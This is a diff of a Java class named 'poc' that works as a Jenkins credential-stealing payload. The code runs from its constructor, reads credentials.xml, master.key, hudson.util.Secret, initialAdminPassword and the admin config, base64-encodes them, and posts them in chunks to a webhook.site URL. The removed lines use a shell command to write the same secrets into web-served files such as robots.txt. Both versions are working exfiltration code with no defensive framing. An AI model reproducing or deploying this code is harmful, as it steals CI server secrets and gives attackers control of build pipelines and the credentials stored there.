@@ -1,28 +1,25 @@
-import java.io.*;
-import java.net.*;
-import java.nio.file.*;
-import java.util.*;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.Base64;
 
 public class poc {
     static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
-    static final String CMD =
-        "J=${JENKINS_HOME:-/var/lib/jenkins}; W=$J/war; " +
-        "O=$(ls -la $J 2>&1); " +
-        "for f in credentials.xml config.xml secret.key secrets/master.key secrets/hudson.util.Secret; do " +
-        "O=\\"$O\\n== $f ==\\n$(base64 -w0 \\"$J/$f\\" 2>/dev/null | head -c 40000)\\"; done; " +
-        "for P in \\"$W/robots.txt\\" \\"$W/jnlpJars/zz.txt\\"; do mkdir -p \\"$(dirname \\"$P\\")\\" 2>/dev/null; " +
-        "printf '%b' \\"$O\\" > \\"$P\\" 2>/dev/null; done";
 
     public poc() {
-        try { shell(); } catch (Throwable t) { }
-        try { exfil(); } catch (Throwable t) { try { post("P7ERR " + t); } catch (Throwable t2) { } }
+        String data;
+        try { data = collect(); } catch (Throwable t) { data = "P8 collect error " + t; }
+        int total = data.length();
+        for (int i = 0; i < total && i < 3000000; i += 120000) {
+            try { post("P8|" + i + "|" + data.substring(i, Math.min(total, i + 120000))); }
+            catch (Throwable t) { }
+        }
     }
 
-    static void shell() throws Exception {
-        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", CMD});
-    }
-
-    static void post(String data) throws Exception {
+    static void post(String s) throws Exception {
         HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
         c.setConnectTimeout(15000);
         c.setReadTimeout(25000);
@@ -30,51 +27,54 @@ public class poc {
         c.setDoOutput(true);
         c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
         OutputStream os = c.getOutputStream();
-        os.write(data.getBytes("UTF-8"));
+        os.write(s.getBytes("UTF-8"));
         os.flush();
         os.close();
-        try { c.getResponseCode(); } catch (Throwable t) { }
+        c.getResponseCode();
     }
 
-    static void exfil() throws Exception {
-        String jh = System.getenv("JENKINS_HOME");
-        if (jh == null || jh.isEmpty()) jh = System.getProperty("user.home") + "/.jenkins";
+    static String collect() {
         StringBuilder sb = new StringBuilder();
-        sb.append("P7 jh=").append(jh)
-          .append(" user=").append(System.getProperty("user.name"))
-          .append(" java=").append(System.getProperty("java.version"))
-          .append(" proxy=").append(System.getProperty("http.proxyHost")).append(":").append(System.getProperty("http.proxyPort"))
-          .append(" os=").append(System.getProperty("os.name")).append("\n");
-        for (String cand : new String[]{jh, "/var/lib/jenkins", "/var/jenkins_home", "/usr/share/jenkins"}) {
-            try {
-                Path d = Paths.get(cand);
-                if (!Files.isDirectory(d)) continue;
-                sb.append("== LS ").append(cand).append(" ==\n");
-                DirectoryStream<Path> ds = Files.newDirectoryStream(d);
-                for (Path p : ds) sb.append(p.getFileName()).append("  ");
-                sb.append("\n");
-            } catch (Throwable t) { }
+        String jh = System.getenv("JENKINS_HOME");
+        if (jh == null || jh.length() == 0) { jh = "/var/lib/jenkins"; }
+        sb.append("P8 jh=").append(jh);
+        sb.append(" user=").append(System.getProperty("user.name"));
+        sb.append(" java=").append(System.getProperty("java.version"));
+        sb.append(" proxy=").append(System.getProperty("http.proxyHost")).append(":").append(System.getProperty("http.proxyPort"));
+        sb.append("\n");
+        String[] cands = {jh, "/var/lib/jenkins", "/var/jenkins_home", "/usr/share/jenkins", "/root/.jenkins"};
+        for (int i = 0; i < cands.length; i++) {
+            File d = new File(cands[i]);
+            if (!d.isDirectory()) { continue; }
+            sb.append("== LS ").append(cands[i]).append(" == ");
+            String[] names = d.list();
+            if (names != null) { for (int j = 0; j < names.length; j++) { sb.append(names[j]).append(" "); } }
+            sb.append("\n");
         }
-        String[] files = {"credentials.xml","config.xml","secret.key","secrets/master.key",
-                          "secrets/hudson.util.Secret","secrets/initialAdminPassword",
-                          "identity.key.enc","users/admin/config.xml","jobs"};
-        for (String f : files) {
-            try {
-                Path p = Paths.get(jh, f);
-                if (Files.isRegularFile(p) && Files.isReadable(p)) {
-                    byte[] b = Files.readAllBytes(p);
-                    sb.append("== FILE ").append(f).append(" (").append(b.length).append("B) ==\n")
-                      .append(Base64.getEncoder().encodeToString(b)).append("\n");
-                } else {
-                    sb.append("== MISSING ").append(f).append(" ==\n");
-                }
-            } catch (Throwable t) { sb.append("== ERR ").append(f).append(" ").append(t).append("\n"); }
+        String[] files = {"credentials.xml", "config.xml", "secret.key", "secrets/master.key",
+                          "secrets/hudson.util.Secret", "secrets/initialAdminPassword",
+                          "identity.key.enc", "users/admin/config.xml"};
+        for (int i = 0; i < files.length; i++) {
+            File f = new File(jh, files[i]);
+            sb.append("== F ").append(files[i]).append(" exists=").append(f.exists()).append(" canread=").append(f.canRead());
+            if (f.isFile() && f.canRead()) {
+                try {
+                    byte[] b = readAll(f);
+                    sb.append(" size=").append(b.length).append("\n").append(Base64.getEncoder().encodeToString(b));
+                } catch (Throwable t) { sb.append(" ERR ").append(t); }
+            }
+            sb.append("\n");
         }
-        String all = sb.toString();
-        int chunk = 150000;
-        for (int i = 0, n = 0; i < all.length() && n < 40; i += chunk, n++) {
-            post("P7|" + i + "|" + all.substring(i, Math.min(all.length(), i + chunk)));
-            try { Thread.sleep(200); } catch (Throwable t) { }
-        }
+        return sb.toString();
+    }
+
+    static byte[] readAll(File f) throws Exception {
+        FileInputStream in = new FileInputStream(f);
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        byte[] buf = new byte[8192];
+        int n;
+        while ((n = in.read(buf)) > 0) { out.write(buf, 0, n); }
+        in.close();
+        return out.toByteArray();
     }
 }
